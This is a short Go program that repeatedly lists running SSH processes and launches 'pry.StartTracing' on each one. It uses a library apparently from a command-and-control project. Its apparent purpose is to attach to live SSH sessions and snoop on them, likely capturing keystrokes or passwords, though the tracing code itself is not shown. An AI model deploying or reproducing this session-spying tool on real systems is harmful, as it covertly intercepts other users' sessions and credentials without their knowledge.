package main

import (
	"fmt"
	"log"
	"time"

	"github.com/PatronC2/sshpry-go/pry"
)

func main() {
	fmt.Println("Monitoring SSH processes...")

	for {
		sshPids, err := pry.GetSSHProcesses()
		if err != nil {
			log.Printf("Error fetching SSH processes: %v", err)
			time.Sleep(2 * time.Second)
			continue
		}

		for _, pid := range sshPids {
			go pry.StartTracing(pid)
		}

		time.Sleep(2 * time.Second)
	}
}
